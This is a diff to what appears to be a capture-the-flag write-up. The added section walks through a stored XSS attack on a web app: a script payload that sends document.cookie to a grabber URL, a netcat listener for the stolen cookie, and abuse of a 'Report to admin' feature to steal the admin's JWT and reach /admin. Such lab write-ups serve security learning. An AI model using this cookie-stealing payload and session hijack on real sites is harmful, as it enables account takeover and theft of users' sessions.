@@ -99,6 +99,58 @@ Reconnaissance:
 --> We recive the token with value encoded. Decode the value we know that is the information user1.
 
 + We can manipulate cookie token by XSS to grant admin and access /admin.
++ Back to home page and we will exploit code.
++ We use "Data grabber for XSS"
++ Link: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss"
+
++ Now we create the new list and create the payload which will send it to a controlled page:
+```bash
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+```
+
+![alt text](image-6.png)
+
++ Use netcat to open the port listen:
+```bash
+nc -lvkp <port>
+# -l: listen mode, for inbound connects
+# -v: verbose mode
+# -k: set keepalive option on socket
+# -p: local port number
+# In the situation, we have to use -k to keep the connection when we back to home page. 
+```
+
++ Look at the netcat:
+
+![alt text](image-7.png)
+
++ We got the recieve about the token cookie that is token user1.
++ Idea in here that is we can manipulate the feature "Report to admin" in the /item to take the token ADMIN.
++ When we report to admin, netcat will capture the request to admin and recive back the token ADMIN.
+
+![alt text](image-8.png)
+
+![alt text](image-9.png)
+
+--> Check netcat again and now we have the token for new user:
+
+![alt text](image-10.png)
+
++ Decode the token:
+```bash
+{
+    "userId": 2,
+    "username": "michael",
+    "admin": true,
+    "iat": 1728993550
+}
+```
+--> User michael with admin permission.
++ We will insert new token replace the token user1 and access again in the page /admin.
+
+![alt text](image-11.png)
+
+
 
 
 ```bash
